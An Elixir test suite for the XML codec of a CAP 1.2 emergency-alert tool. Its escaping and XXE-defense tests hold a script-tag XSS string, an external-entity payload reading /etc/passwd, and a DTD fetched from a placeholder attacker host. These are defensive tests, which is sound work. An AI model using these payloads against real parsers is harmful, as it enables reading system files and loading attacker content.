defmodule CapAlertWorkbench.Cap.Xml.CodecTest do
  use ExUnit.Case, async: true

  alias CapAlertWorkbench.Cap.Message
  alias CapAlertWorkbench.Cap.Xml.Codec

  describe "encode!/1" do
    test "produces CAP 1.2 XML with explicit namespace and enumerated values" do
      message = Codec.seed_message()
      xml = Codec.encode!(message)

      assert xml =~ ~s(<?xml version="1.0" encoding="UTF-8"?>)
      assert xml =~ ~s(xmlns="urn:oasis:names:tc:emergency:cap:1.2")
      assert xml =~ "<identifier>CN-20260729-GD-RAIN-001</identifier>"
      assert xml =~ "<status>Actual</status>"
      assert xml =~ "<msgType>Alert</msgType>"
      assert xml =~ "<scope>Public</scope>"
      assert xml =~ "<urgency>Immediate</urgency>"
      assert xml =~ "<severity>Severe</severity>"
      assert xml =~ "<certainty>Likely</certainty>"
      assert xml =~ "<value>440800</value>"
      assert xml =~ "<value>440900</value>"
      assert xml =~ "<areaDesc>湛江市</areaDesc>"
    end

    test "escapes special characters rather than concatenating raw strings" do
      message =
        Codec.seed_message(
          headline: ~s(暴雨 & 强对流 <预警> "测试"),
          description: "脚本标签 <script>alert(1)</script> 必须转义"
        )

      xml = Codec.encode!(message)

      refute xml =~ "<script>alert(1)</script>"
      assert xml =~ "&lt;script&gt;alert(1)&lt;/script&gt;"
      assert xml =~ "暴雨 &amp; 强对流 &lt;预警&gt; &quot;测试&quot;"
    end

    test "raises on invalid enumerated values" do
      message = %{Codec.seed_message() | status: :not_a_real_status}

      assert_raise ArgumentError, fn ->
        Codec.encode!(message)
      end
    end
  end

  describe "decode/1" do
    test "round-trips the seed message through encode/decode/encode" do
      message = Codec.seed_message()
      xml = Codec.encode!(message)
      assert {:ok, decoded} = Codec.decode(xml)
      assert %Message{} = decoded

      assert decoded.identifier == "CN-20260729-GD-RAIN-001"
      assert decoded.status == :actual
      assert decoded.msg_type == :alert
      assert decoded.scope == :public
      assert decoded.urgency == :immediate
      assert decoded.severity == :severe
      assert decoded.certainty == :likely
      assert decoded.area_codes == ["440800", "440900"]

      assert Codec.encode!(decoded) == xml
    end

    test "rejects XML containing a DOCTYPE (XXE defense)" do
      xml = """
      <?xml version="1.0"?>
      <!DOCTYPE alert [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <alert xmlns="urn:oasis:names:tc:emergency:cap:1.2">
        <identifier>&xxe;</identifier>
      </alert>
      """

      assert {:error, {:xml_sax_error, _}} = Codec.decode(xml)
    end

    test "rejects external entity declarations" do
      xml = """
      <?xml version="1.0"?>
      <alert xmlns="urn:oasis:names:tc:emergency:cap:1.2">
        <identifier>test</identifier>
      </alert>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example.com/x.dtd">]>
      """

      # SAX parser will reject the DTD
      assert {:error, _} = Codec.decode(xml)
    end

    test "preserves unknown extension fields for round-trip" do
      message = %{
        Codec.seed_message()
        | extensions: [
            %{
              name: "gd:channel",
              ns: "",
              attrs: %{"type" => "sms"},
              children: ["请立即处置"]
            }
          ]
      }

      xml = Codec.encode!(message)
      assert {:ok, decoded} = Codec.decode(xml)

      assert length(decoded.extensions) >= 1
      ext = hd(decoded.extensions)
      assert ext.name == "gd:channel"
      assert ext.attrs["type"] == "sms"
      assert ext.children |> Enum.join("") |> String.trim() == "请立即处置"

      # Re-encoding is byte-identical (extensions round-trip exactly).
      assert Codec.encode!(decoded) == xml
    end
  end

  describe "reference timestamp formatting" do
    test "formats UTC times with explicit +00:00 offset" do
      assert Codec.format_ref_time(~U[2026-07-29 08:00:00Z]) == "2026-07-29T08:00:00+00:00"
    end
  end
end
